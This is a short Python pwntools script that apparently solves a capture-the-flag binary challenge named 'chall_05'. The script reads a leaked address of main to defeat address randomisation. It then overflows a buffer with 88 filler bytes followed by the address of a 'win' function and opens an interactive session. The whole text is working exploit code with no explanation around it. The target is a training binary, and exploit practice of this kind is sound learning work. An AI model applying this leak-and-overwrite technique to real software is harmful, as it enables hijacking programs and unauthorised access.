#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_05')

p = process(binary.path)
p.recvuntil(b'I wonder what this is: ')
_ = p.recvline().strip()
main = int(_,16)
binary.address = main - binary.sym.main
log.info('binary.address: ' + hex(binary.address))

payload  = b''
payload += 88 * b'A'
payload += p64(binary.sym.win)

p.sendline(payload)
p.interactive()
